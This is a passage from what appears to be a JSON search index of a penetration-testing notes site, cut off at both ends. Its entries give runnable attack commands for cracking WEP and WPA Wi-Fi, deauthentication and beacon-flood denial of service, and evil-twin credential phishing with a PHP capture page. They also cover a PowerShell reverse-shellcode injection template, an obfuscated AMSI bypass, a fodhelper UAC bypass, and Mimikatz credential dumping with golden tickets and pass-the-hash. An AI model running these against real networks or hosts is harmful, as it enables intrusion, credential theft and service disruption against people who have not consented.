&lt;nuestraMAC &gt; wlan0mon # Presionamos ‘y’ ; packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt; aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt; SKA Type Cracking airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon aireplay-ng -0 10 –a &lt;BSSID&gt; -c &lt;macVictima&gt; wlan0mon ifconfig wlan0mon down macchanger –-mac &lt;macVictima&gt; wlan0mon ifconfig wlan0mon up aireplay-ng -3 –b &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon aireplay-ng –-deauth 1 –a &lt;BSSID&gt; -h &lt;macFalsa&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt;"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wpa-wpa2-peap-enterprise": {
						"id": "hacking-wifi-wpa-wpa2-peap-enterprise",
						"title": "Hacking Wifi - WPA/WPA2 PEAP (Enterprise)",
						"category": "",
						"url": " /hacking-wifi/wpa-wpa2-peap-enterprise/",
						"content": "In networks with WPA2 PEAP which means Enterprise don’t use a pre shared key, the users authenticate with the LDAP credentials. As the router or AP doesn’t know if the credentials are correct or not, it delegate to a RADIUS server. The handshake can’t not be capture because the authentication is not completed by the server so instead of capturing the handshake we will create a EvilTwin but in this case with authentication (Which we are interesting to capture, remember that there are LDAP credentials). EvilTwin To carry out this task, we are going to use hostapd-wpe software. Configuring Certificates First we need to aclare that when the user will authenticate to our fake AP, some information about the certificate will be displayed, in order to cheat our víctims, the certificate will seems as much real as posible. So we need to modify the following files: etc hostapd-wpe certs server.cnf [server] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = admin@redteam.com commonName = \"Certificado de Red Team Inc.\" etc hostapd-wpe certs client.cnf [client] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = user@redteam.com commonName = user@redteam.com etc hostapd-wpe certs ca.cnf [certificate_authority] countryName = ES stateOrProvinceName = Salamanca localityName = Salamanca organizationName = Red Team Inc. emailAddress = admin@redteam.com commonName = \"Entidad certificadora de Red Team Inc.\" Finally, we just need to create it with bootstrap. etc hostapd-wpe certs bootstrap Configuring te Fake AP Onced configured and created the certificates, the final step is to configure our FAKE AP. We need to create a backup of the default hostapd config file and modify it. cp etc hostapd-wpe hostapd-wpe.conf etc hostapd-wpe redteam.conf vim etc hostapd-wpe redteam.conf #Modify the following values: interface=&lt;IFACE&gt; ssid=&lt;ESSID&gt; channel=&lt;CHANNEL&gt; Launch &amp; wait for s3crets Finally, just launch the hostapd-wpe indicating the modified configuration file. hostapd-wpe etc hostapd-wpe redteam.conf When the victim falls into our trap, we can obtain their NETLM hash."
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wpa-wpa2-psk": {
						"id": "hacking-wifi-wpa-wpa2-psk",
						"title": "Hacking Wifi - WPA/WPA2 PSK",
						"category": "",
						"url": " /hacking-wifi/wpa-wpa2-psk/",
						"content": "Introduction Setup sudo airmon-ng check kill sudo airmon-ng sudo airmon-ng start wlan0 # Change MAC ifconfig wlan0mon down macchanger -s wlan0mon ifconfig wlan0mon up To restart network services: sudo airmon-ng stop wlan1mon sudo service NetworkManager restart Start capturing: # 802.11.g is for 5GHz if you don't have the suitable hardwarte try to use --band ab sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; [--band abg] --write &lt;OUT_FILE&gt; &lt;IFACE&gt; Handshake Capture (Clients needed) Deauth Consist on deauthenticate a client in order to capture de re-authentication handshake. aireplay-ng -0 10 -a &lt;BSSID&gt; -c &lt;CLIENT&gt; &lt;IFACE&gt; Deauth Global The same term of deauthentication, but in that case using the brodcast MAC address in order to deauthenticate all clients. airplay-ng -0 0 -e &lt;ESSID&gt; -c FF:FF:FF:FF:FF:FF &lt;IFACE&gt; Auth attack or Authentication DoS Mode Could be sound strange, but if you authenticate 5000 clients to the Access Point is possible to kick out client of the network and then capture their handshake. airplay-ng -1 0 -e &lt;ESSID&gt; -h 00:a0:8b:cd:02:65 &lt;IFACE&gt; #To authenticate 1 client mdk3 &lt;IFACE&gt; a -a &lt;BSSID&gt; #Authenticating clients until DoS Finally the AP will eject the clients with less power rate. Dissassociation Amok Mode Attack Same as deauthentication attack but mdk3 gives us the opportunity to introduce allow deny lists. blacklist.txt: a0:e4:b2:45:f6:87 mdk3 &lt;IFACE&gt; d -w blacklist.txt -c 1 Validating the handshake Sometimes aircrack-ng tells us that it capture a handshake when it hasn’t. So we can validate it with pyrit. pyrit -r Capture-01.cap analyze Filtering the capture When we are trying to capture a handshake, maybe we are capturing a lot of packets, so we just need to filter that. (EAPOL -&gt; Handshakes) (wlan.fc.type_subtype==0x08 are Beacons) (wlan.fc.type\\_subtype==0x05 are Probe Response) tshark -r Capture-01.cap -Y \"wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol\" -F pcap 2&gt; dev null tshark -r Capture-01.cap -Y \"wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol\" -w filteredCapture -F pcap 2&gt; dev null pyrit -r filteredCapture analyze Also it is recommended filtering with the target BSSID. tshark -r Capture-01.cap -Y \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -w filteredCapture -F pcap 2&gt; dev null IF you want to do a doble analysis you may change -Y parameter to -R \"FILTER\" -2 tshark -r Capture-01.cap -R \"(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53\" -2 -w filteredCapture -F pcap 2&gt; dev null Hash extraction First we need to save our handshaek in HCCAP to after use hccap2john and crack it. aircrack-ng -J capture Capture-01.cap # For john hccap2john capture.hccap &gt; handshake.hash aricrack-ng -j capture Capture-01.cap # For hashcat Cracking the hanshake Dictionary Attack john --wordlist= usr share wordlist rockyou.txt handshake.hash --format=wpapsk john --show --format=wpapsk handshake.hash aircrack-ng -w usr share wordlist rockyou.txt Capture-01.cap hashcat -m 2500 -d 1 capture.hccapx usr share wordlists rockyou.txt --force -w 3 hashcat --show -m 2500 capture.hccapx Rainbow Table Airolib + Aircrack With airolib we can create a dictionary with PMKS. airolig-ng passwords-airolib --import passwd usr share wordlists rockyou.txt echo \"&lt;ESSID&gt;\" &gt; essid.lst airolib-ng passwords-airolib --import essid essid.lst airolib-ng passwords-airolib --stats #Test if all is working correctly airolib-ng passwords-airolib --clean all #Clean the wordlists to ileggible characters airolib-ng passwords-airolib --batch #Create the wordlists Onced created we just need to use aircrack aircrack-ng -r passwords-airolib_Capture-01.cap We can see that the speed of cracking of aircrack-ng goes from 10k s up to 200k s. Genpmk + (Cowpatty or Pyrit) First we need to create a new dictionary. genpmk -f usr share wordlists rockyou.txt -d dic.genpmk -s &lt;SSID&gt; And crackit with Cowpatty: cowpatty -d dic.genpmk -r Captura-01.cap -s &lt;ESSID&gt; #Up to 360k s More faster? try with Pyrit: pyrit -i dic.genpmk -e &lt;ESSID&gt; -r Captura-01.cap attack_cowpatty #Up to 2M s You still want to go faster? Try pyrit with Database: pyrit -i usr share wordlists rockyou.txt import_passwords pyrit -e &lt;ESSID&gt; create_essid pyrit batch #Finally attack pyrit -r Captura-01.cap attack_db #Up to 20M s DoS attacks CTS Frame Attack The protocol 802.11 is CSMA CA, CA is Collision Avoidance, so in that protocol appear two new types of packets. CTS (Clear to Send) and RTS (Request to Send) that provides to the network the ability to avoid collisions between frames. What happens if we flood the network with 1000 CTS frames with the time field on his maximum value (30.000 us), if we flood with that TCP stream we will hijack all the bandwidth causing a Denial of Service. First we need to capture and modify one Clear-to-send frame and modify the Duration to 30.000 us and modify the RA address. Onced created out evil frame we just need to send several times to the network. tcpreplay --intf1=&lt;IFACE&gt; --topspeed --loop=10000 evilframe.pcap 2&gt; dev null Actual: 10000 packets (460000 bytes) sent in 3.01 seconds Rated: 152428.1 Bps, 1.21 Mbps, 3313.65 pps Statistics for network device: wlx00c0caaba818 Successful packets: 10000 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 In that case we busy the channel for: Beacon Flood Mode Attack The beacon frame is a frame that contains information about the access point such as the channel where the AP is working, ciphers, protocols, etc. These type of beacons are transmitted in plain as other stations and devices need these frames to extract information in order to connect them. The idea of Beacon Flood Attack such as his name says, flood a large number of beacons in order to create a lot of ESSID in the same Chanel as the target AP in order to make it invisible for users. # Create a list of AP names: MyNetwork1 MyNetwork2 MyNetwork3 MyNetwork4 MyNetwork5 MyNetwork6 MyNetwork7 MyNetwork8 MyNetwork9 MyNetwork10 mdk3 &lt;IFACE&gt; b -f networks.txt -a -s 1000 -c &lt;CHANNEL&gt; # -a -&gt; WPA2 -s &lt;speed&gt; Michael Shutdown Explotation Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets, but less effective. mdk3 &lt;IFACE&gt; m -t &lt;BSSID&gt; Evil Twin One of the most common techniques to obtain the password of a wireless network via phishing. It’s common that the devices emit Probe Request frames when their are not associated to any AP. These Probe Request frame ares packets that contain information about which SSID the device was connected before. So we can abuse of that information in order to create a Fake AP with the same SSID. thark -i &lt;IFACE&gt; -Y \"wlan.fc.type_subtype==4\" 2&gt; dev null 1 0.000000000 Apple_7d:1f:e9 → Broadcast 802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51 2 0.019968349 Apple_7d:1f:e9 → Broadcast 802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51 Creating DHCP file etc dhcpd.conf authoritative; default-lease-time 600; max-lease-time 7200; subnet 192.168.1.128 netmask 255.255.255.128 { option subnet-mask 255.255.255.128; option broadcast-address 192.168.1.255; option routers 192.168.1.129; option domain-name-servers 8.8.8.8; range 192.168.1.130 192.168.1.140; } Configuring the web page (LOGIN ROUTER WIFI) Search and copy the html of a login webpage with the following action form: &lt;tr&gt;&lt;td&gt;&lt;form action=\"dbconnect.php\" method=\"post\"&gt; And the appropriate dbconnect.php &lt;?php session_start(); ob_start(); $host=\"localhost\"; $username=\"fakeap\"; $pass=\"fakeap\"; $dbname=\"evilTwin\"; $tbl_name=\"sniff\"; Create connection $conn = mysqli_connect($host, $username, $pass, $dbname); Check connection if (!$conn) { die(\"Connection failed: \" . mysqli_connect_error()); } $username=$_POST['username']; $password=$_POST['password']; $sql = \"INSERT INTO sniff (username, password) VALUES ('$username', '$password')\"; if (mysqli_query($conn, $sql)) { echo \"New record created successfully\"; } else { echo \"Error: \" . $sql . \"&lt;br&gt;\" . mysqli_error($conn); } mysqli_close($conn); sleep(2); header(\"location:upgrading.html\"); ob_end_flush(); ?&gt; Initializazing services We need to start apache2 and mysql service apache2 start &amp;&amp; service mysql start Configuring MySQL As we can see in dbconnect.php it’s trying to connect to a evilTwin db with fakeap user, so we just need to configure mysql properly. Creating the DB mysql -u root create database evilTwin; create table sniff(username varchar(32), password varchar(32)); show tables; +--------------------+ | Tables_in_evilTwin | +--------------------+ | wpakeys | +--------------------+ 1 row in set (0.00 sec) insert into sniff(username, password) values (\"TESTKEY\", \"TESTKEY\"); select * from sniff; +-----------+-----------+ | username | password | +-----------+-----------+ | TESTKEY | TESTKEY | +-----------+-----------+ 1 row in set (0.00 sec) Creating a user for the DB mysql -u root create user fakeap@localhost identified by 'fakeap'; grant all privileges on evilTwin.* to 'fakeap'@'localhost'; FLUSH PRIVILEGES; At this point onced we introduced credentials via the web panel, it will be appended in our database. Creating the AP With airbase we can set up our fake AP without authentication: airbase-ng -e &lt;ESSID&gt; -c &lt;CHANNEL&gt; -P &lt;IFACE&gt; Configuring a new network interface Onced launched our new fake AP, we need to add a new network interface. ifconfig at0 192.168.1.129 netmask 255.255.255.128 route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129 echo 1 &gt; proc sys net ipv4 ip_forward ifconfig at0 at0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.1.129 netmask 255.255.255.128 broadcast 192.168.1.255 inet6 fe80::e670:b8ff:fed3:935c prefixlen 64 scopeid 0x20&lt;link&gt; ether e4:70:b8:d3:93:5c txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 57 bytes 8828 (8.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Configuring IP tables The idea is to redirect the traffic coming from victims from at0 to eth0 in order to give them connection to internet. iptables --flush iptables --table nat --flush iptables --delete-chain iptables --table nat --delete-chain iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE iptables --append FORWARD --in-interface at0 -j ACCEPT iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80 iptables -t nat -A POSTROUTING -j MASQUERADE Syncronize Finally the last step is syncronize our rules to the fake AP. dhcpd -cf etc dhcpd.conf -pf var run dhcp.pid at0 Attacks without Clients In this section we are not going to capture any type of handshake to obtain the hash or key. We are goin to attack the network in a client-less mode. PKMID Attack This attack allows us to break the technology using Pairwise Master Key Identifier (PKMID) which is a characteristic available in a lot of devices. Via Bettercap The results will be exported on a pcap file. bettercap -iface &lt;IFACE&gt; iface &gt;&gt; wifi.recon on iface &gt;&gt; wifi.show iface &gt;&gt; wifi.assoc all Via hcxdumptool Same as bettercap, the results will be exported on a pcap file. hcxdumptool -i &lt;IFACE&gt; -o &lt;OUT_FILE&gt; --enable_status=1 Export results fo hashcat &amp;&amp; Cr4ck it! Using hcxpcaptool we can easily transform the output of bettercap or hcxdumptool to hashcat. hcxpcaptool -z hashes.hash Capture.pcap hashcat -m 16800 -d 1 -w 3 hashesh.hash usr share wordslist rockyou.txt WPS Attack Wifi Protected Setup aka WPS is a wireless network security standard that tries to make connections between a router and devices faster and easier. WPSPinGenerator is an automatic tool available in Wifislax. First we need to choose the interface to work with and the channels where we want to listen. We can see the generic PINS if they are available on the network by selection the suitable SSID. Finally we just need to test the PIN and wait for success. Noticed that after 3 fail attempts the WPS could lock."
					}

					
				
			
		
			
				
					,
					

					"other-hacking-aws": {
						"id": "other-hacking-aws",
						"title": "Hacking AWS",
						"category": "",
						"url": " /other/hacking-aws/",
						"content": "Amazon Web Services is a subsidiary of Amazon providing on-demand cloud computing platforms and APIs. S3 Buckets Amazon S3 has a simple web services interface that you can use to store and retrieve any amount of data, at any time, from anywhere on the web. AWS Configuration You can get your credential here https: console.aws.amazon.com iam home?# security_credential but you need an aws account, free tier account : https: aws.amazon.com s dm optimization server-side-test free-tier free_np aws configure --profile &lt;PROFILE_NAME&gt; AWSAccessKeyId= &lt;AccessKeyID&gt; AWSSecretKey= &lt;SecretKey&gt; Default Region Name= &lt;Region&gt; Default Output Format = &lt;json or text&gt; Or you can configure by default: aws configure Search for S3 Buckets We need to identify if the service running is a s3. http: s3.amazonaws.com [bucket_name] http: [bucket_name].s3.amazonaws.com You can get the region of a bucket with a dig and nslookup: $ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. Enumeration We will use aws-cli tool Use --no-sign-request for check Everyones permissions Use --profile &lt;PROFILE_NAME&gt; to indicate the previous configuration profile. Search Buckets inside the same host: aws s3 ls --endpoint-url http: s3.DOMAIN.COM --no-sign-request List content of a bucket: aws s3 ls s3: BUCKET-NAME --endpoint-url http: s3.DOMAIN.COM --no-sign-request Copy content: aws s3 cp tmp FILE s3: BUCKET-NAME --endpoint-url http: s3.DOMAIN.COM --no-sign-request DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. List tables aws dynamodb list-tables --endpoint-url http: s3.DOMAIN.COM { \"TableNames\": [ \"TABLENAME\" ] } Get Table Content aws dynamodb scan --table-name TABLENAME --endpoint-url http: s3.DOMAIN.COM { \"Items\": [ { \"password\": { \"S\": \"PWD@#1@#\" }, \"username\": { \"S\": \"USER3\" } }, { \"password\": { \"S\": \"PWD!\" }, \"username\": { \"S\": \"USER2\" } }, { \"password\": { \"S\": \"PWD\" }, \"username\": { \"S\": \"USER1\" } } ], \"Count\": 3, \"ScannedCount\": 3, \"ConsumedCapacity\": null } Create Table aws dynamodb create-table --table-name TABLENAME--attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --endpoint-url http: s3.DOMAIN.COM Create Item aws dynamodb update-item --table-name TABLENAME--key file: FILE.json --endpoint-url http: s3.DOMAIN.COM # where FILE.json is: { \"title\": {\"S\": \"TITLECONTENT\"}, \"data\": {\"S\": \"DATACONTENT\"} } References https: book.hacktricks.xyz pentesting pentesting-web buckets aws-s3 https: docs.aws.amazon.com cli latest reference dynamodb index.html"
					}

					
				
			
		
			
				
					,
					

					"other-hacking-with-powershell": {
						"id": "other-hacking-with-powershell",
						"title": "Hacking with PowerShell",
						"category": "",
						"url": " /other/hacking-with-powershell/",
						"content": "Basic explanation about what is Powershell and how we can use it in out hacking days. What is Powershell? Powershell is the Windows Scripting Language and shell environment that is built using the .NET Framework. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects, making Powershell somewhat object oriented. Note: The normal format of cmdlet is represented using Verb-Noun. Ex: Get-Command Common verbs used are the following ones: Get Start Stop Read Write New Out Using Get-Help Get-Help displays information about a cmdlet. To get help about a particular command, run the following: Get-Help cmdlet Get-Help cmdlet -Full Get-Help cmdlet -Examples Note: To show some examples execute Get-Help cmdlet -Examples Using Get-Command Get-Command gets all the cmdlets installed on the current Computer. Running Get-Command Verb-* or Get-Command *-Noun filters the search. Object Manipulation If we want to actually maniputare the output, we need to figure out a few things: Passing output to other cmdlets. Using specific object cmdlets to extract information. To pas the output to another cmdlet like bash scripting is with the Pipeline “|”. Verb-Noun | Get-Member -MemberType Equals Creating Objects From Previous cmdlets One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Get-ChildItem | Select-Object -Property Mode, Name Filtering Objects When retrieving output objects, you may want to select objects that match a very specific value. You can do that using the Where-Object. Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} This are the following operators: -contains: Exact match for the specified value. -eq: Equals to. -gt: Greater than. Sort Objects May you need to sort the output of a cmdlet in order to extract the information more efficiently. You can do this with Sort-Object cmdlet. Verb-Noun | Sort-Object Importing modules It is also posible to import our self modules. Import-Module &lt;modulepath&gt;.ps1 . . &lt;modulepath&gt;.ps1 Onced imported we can list all commands that we previously imported. Get-Command -Module &lt;modulename&gt;"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-av-evasion": {
						"id": "post-exploitation-av-evasion",
						"title": "AV Evasion",
						"category": "",
						"url": " /post-exploitation/av-evasion/",
						"content": "A basic template script that performs in-memory injection: $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru; [Byte[]]; # msfvenom -p windows shell_reverse_tcp LHOST=&lt;ip_addr&gt; LPORT=&lt;port&gt; -f powershell [Byte[]]$sc = &lt;place your shellcode here&gt;; $size = 0x1000; if ($sc.Length -gt 0x1000) {$size = $sc.Length}; $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40); for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}; $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; Another way to bypass AV is using Shellter String Replacement FUTURE CONTENT https: s3cur3th1ssh1t.github.io Building-a-custom-Mimikatz-binary https: s3cur3th1ssh1t.github.io Customizing_C2_Frameworks AMSI bypass AMSI bypass method to execute powershell scripts such as Invoke-Mimikatz.ps1 with PowerShell Remote. First we need to create a session on the target machine. $sess = New-PSSession -ComputerName srv01.corp.local Enter-PSSession -Session $sess Execute the following payload and exit the session. sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} ) Import the script remotely with PowerShell Remote: Invoke-Command -FilePath .\\Invoke-Mimikatz.ps1 -Session $sess Enter in the session again and execute the malicious script. Enter-PSSession -Session $sess Invoke-Mimikatz -Command '\"sekurlsa::tickets' Note: More bypasses are available on the following resource: https: gist.github.com reigningshells a255fcca07465befbcbf4be9cdf67560"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-bypass-uac": {
						"id": "post-exploitation-bypass-uac",
						"title": "Bypass UAC",
						"category": "",
						"url": " /post-exploitation/bypass-uac/",
						"content": "Fodhelper.exe REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command v DelegateExecute t REG_SZ REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command d \"cmd.exe\" f fodhelper.exe"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-get-credentials": {
						"id": "post-exploitation-get-credentials",
						"title": "Gathering Credentials",
						"category": "",
						"url": " /post-exploitation/get-credentials/",
						"content": "After compromising a target is important to recollect the maximum credentials to spray them on the network. Looking for Interesting Files If the target have a web application that use a database try to find the config.php file in order to obtain the database connection. Look what type of applications are installed and look for config files in order to find new pair of creds. Mimikatz It can be user to dump credentials,cached logon credentials, SAM, System, LSASS, VAULT, tuickets and more… To dump those credentials admin privs are needed. .\\mimikatz.exe privilege::debug sekurlsa::logonpasswords full sekurlsa::wdigest sekurlsa::credman lsadump::sam vault::cred vault::list ts::mstsc ts::sessions .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords full\" \"sekurlsa::wdigest\" \"sekurlsa::credman\" \"lsadump::sam\" \"vault::cred\" \"vault::list\" \"ts::mstsc\" \"exit\" Note: if sekurlsa::logoncredentials does not work in Windows 10 or Server 2019 download a older realease. mimikatz.exe v 2.1.1 Invoke-Mimikatz The script is userful to execute mimikatz with PowerShell without droppin the mimikatz exe to disk. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script. Like mimikatz.exe the script needs administrative privileges for dumping credentials from local machine. https: github.com PowerShellMafia PowerSploit blob master Exfiltration Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds We can also dump credentials on multiple remote machines. Invoke-Mimikatz -DumCreds -ComputerName @(\"machine01\",\"machine02\") Invoke-Mimikatz gives us the oportunity to excute differents attacks. Examples of Attacks: Over pass the Hash: Invoke-Mimikatz -Command '\"sekurlsa::pth usr:Administrator domain:corp.local ntlm:&lt;ntlmhash&gt; run:powershell.exe\"' Crafting a golden ticket: Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:512 startoffset:0 endin:600 renewmax:10080 ptt\"' Hijacking RDP Session To hijack a RDP session we need mimikatz. .\\mimikatz.exe privilege::debug ts::sessions ts::mstsc token::elevate ts::remote id:3 SAM and SYSTEM (Win) You can easily dump the SAM and SYSTEM registries using the command prompt. Just open the cmd.exe as Administrator and run the following commands: reg save HKLM\\SAM c:\\windows\\temp\\sam reg save HKLM\\SYSTEM c:\\windows\\temp\\system Finally on our kali we just need to use sam2dump to get the hashes. samdump2 system sam &gt; hashes.txt PASSWD and SHADOW (Lin) Same as Windows, when we pwn a privilege user such as root we can get system users and passwords. In linux we just need to copy the following files to our attacking machine. etc passwd etc shadow Finally on our kali machine we just need to use unshadow to get the hashes: unshadow passwd shadow &gt; hashes.txt Mozilla Firefox Thunderbird WaterFox SeaMonkey Some users victims uses Mozilla Firefox or Mozilla Thunderbird and stores their credentials without protection. On windows search the following route: C:\\Users\\VICTIM\\AppData\\Roaming Zip the content of Firefox or Thunderbird folder and transfer it to the attacking machine. Once transferred we are going to use firefox-decrypt tool to get the plaintext credentials. $ python firefox_decrypt.py folder containing profiles.ini Master Password for profile tmp Thunderbird Profiles s68bba5j.default: 2021-09-21 19:55:06,811 - WARNING - Attempting decryption with no Master Password Website: mailbox: test.local Username: 'eric' Password: 'sup3rs3cr3t' Website: smtp: test.local Username: 'eric' Password: 'sup3rs3cr3t' https: github.com unode firefox_decrypt"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-password-cracking": {
						"id": "post-exploitation-password-cracking",
						"title": "Password Cracking",
						"category": "",
						"url": " /post-exploitation/password-cracking/",
						"content": "Cryptography is a method of protecting information and communications through the use of codes, so that only those for whom the information is intended can read and process it. Crypto 101 👁 Hashing Introduction A hash is a function that converts one value to another. Hashing data is a common practice in computer science and is used for several different purposes. Examples include cryptography, compression, checksum generation, and data indexing. Hashing is a natural fit for cryptography because it masks the original data with another value. A hash function can be used to generate a value that can only be decoded by looking up the value from a hash table. The table may be an array, database, or other data structure. A good cryptographic hash function is non-invertible, meaning it cannot be reverse engineered. Password Cracking In cryptanalysis and computer security, password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system. Hashcat is one of the most powerful password cracking tools at the moment. First we need to fount which type of hash we are trying to crack, this guide contains all hash types that hashcat supports. hashcat -a 0 -m mode passwd.hash wordlist Caution: In order to avoid false positives or false negatives never use –force parameter. Or you can use Google Colab to crack the hashes: https: github.com mxrch penglab Or other online free crackers: https: crackstation.net https: www.md5online.org md5-decrypt.html https: md5.gromweb.com Rules Typical password-enforcement rules are collected in some dictionaries, these types of rules generally require the use of upper and olwe-case characters, numbers and special characters. hashcat -a 0 -m mode passwd.hash -r rules wordlist Note: Hashcat rules are located in usr share hashcat rules Selecting a correct Worlist We can use common wordlists like rockyou.txt or some from SecLists, but also we can create a custom one. Cewl gives us the opportunity to browse the website and manually add commonly-used termns and product names to our custom wordlists. Also we can select the minimum length of the passwords wit -m parameter. cewl www.example.com -m 6 -2 wordlist.out Encryption Introduction The two main categories of Encryption are symmetric and asymmetric. Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long). Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys. Cracking SSH private key After getting the private ssh key protected with a passphrase, in order to obtain this passphrase we will need to convert that ssh key to john format, for that run ssh2john script: python ssh2john id_rsa &gt; id_rsa.hash And crack it with your fav list: john id_rsa.hash -wordlist=[wordlist] Cracking KDBX (KeePass Files) First we need to convert our file to a hash. python keepass2john file.kdbx &gt; kdbx.hash And crack it with your fav list: john kdbx.hash -wordlist=[wordlist] hashcat -a 0 -m 13400 kdbx.hash [wordlist] Decrypting openssl enc data with salted password When we found some file like that: ❯ file file.enc file.enc: openssl enc'd data with salted password We can crack the password with bruteforce-salted-openssl specifying the digest and cipher (AES-256-CBC by default). bruteforce-salted-openssl -t 50 -f rockyou.txt -d &lt;digest&gt; file.enc -1 Finally we need to decrypt the file with the key obtained while bruteforcing. openssl aes-256-cbc -d -in file.enc -out file.txt -k &lt;KEY&gt; Ciphers Detection There are many online tools that helps to detect which type of cipher is applied based on entropy. https: www.boxentriq.com code-breaking cipher-identifier Also there are a lot of online tools to decode or encode with different ciphers: https: www.dcode.fr https: gchq.github.io CyberChef Note: quipqiup is a powerfull tool that solves simple subsitution ciphers. https: quipqiup.com References: https: techterms.com definition hash https: www.abhizer.com crack-ssh-with-john"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-port-forwarding": {
						"id": "post-exploitation-port-forwarding",
						"title": "Port Forwarding and Tunneling",
						"category": "",
						"url": " /post-exploitation/port-forwarding/",
